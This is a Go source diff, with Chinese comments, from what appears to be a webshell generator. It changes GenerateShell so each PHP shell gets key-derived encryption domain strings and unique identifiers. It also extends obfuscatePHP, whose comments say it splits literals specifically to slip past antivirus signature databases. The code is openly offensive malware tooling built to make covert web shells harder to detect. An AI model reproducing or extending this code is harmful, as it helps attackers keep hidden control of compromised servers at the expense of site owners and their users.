@@ -39,8 +39,9 @@ type GeneratedShell struct {
 	RegisterHint string `json:"register_hint"`
 }
 
-// tplIdentNames 是两份模板用到的全部 {{.Xxx}} 占位（KeyB64 除外，单独处理）。
-// 生成器为每个占位分配随机标识符；渲染用 missingkey=error，占位遗漏直接报错。
+// tplIdentNames 是两份模板用到的全部 {{.Xxx}} 占位（KeyB64 与域分隔串 DEnc/DMac
+// 除外，后三者由密钥派生、单独处理）。生成器为每个占位分配随机标识符；
+// 渲染用 missingkey=error，占位遗漏直接报错。
 var tplIdentNames = []string{
 	// PHP 模板
 	"VKey", "VMethods", "VMode", "VResp", "VPlain", "VJson", "VReq", "VOp",
@@ -95,9 +96,11 @@ func GenerateShell(lang string, obfuscate bool, note string) (*GeneratedShell, e
 		return nil, opError("generate", "密钥生成失败： %v", err)
 	}
 	keyB64 := base64.StdEncoding.EncodeToString(key)
+	// CBC 域分隔串随密钥派生（批 7 P0-4：每份马体不同,与驱动侧 encDomains 同一算法）。
+	encDom, macDom := encDomains(key)
 
 	// 每个占位一个随机标识符（集合去重：撞名会让两个语义变量同名，必须排除）。
-	fields := map[string]string{"KeyB64": keyB64}
+	fields := map[string]string{"KeyB64": keyB64, "DEnc": encDom, "DMac": macDom}
 	used := map[string]bool{}
 	for _, name := range tplIdentNames {
 		if _, ok := fields[name]; ok {
@@ -120,7 +123,7 @@ func GenerateShell(lang string, obfuscate bool, note string) (*GeneratedShell, e
 	}
 	content := buf.String()
 	if obfuscate && lang == "php" {
-		content = obfuscatePHP(content, keyB64)
+		content = obfuscatePHP(content, keyB64, encDom, macDom)
 	}
 	digest := sha256.Sum256(key)
 	var fnb [3]byte
@@ -147,8 +150,8 @@ func GenerateShell(lang string, obfuscate bool, note string) (*GeneratedShell, e
 // 取舍（注释即承诺）:只做拆分/拼接这类「等价改写」,不做 eval(base64(...))、
 // gzinflate 套娃等高特征形态——那是签名库首要命中点，变形收益为负；轻度变形
 // 抹掉的是「整串常量」特征，同时保持马体可读可审计。
-func obfuscatePHP(src, keyB64 string) string {
-	literals := []string{keyB64, "aes-256-gcm", "aes-256-cbc", "artex-enc-v1", "artex-mac-v1", "php://input"}
+func obfuscatePHP(src, keyB64, encDom, macDom string) string {
+	literals := []string{keyB64, "aes-256-gcm", "aes-256-cbc", encDom, macDom, "php://input"}
 	// 长字面量优先，防短串恰好是长串子串造成二次拆分。
 	sort.Slice(literals, func(i, j int) bool { return len(literals[i]) > len(literals[j]) })
 	for _, lit := range literals {
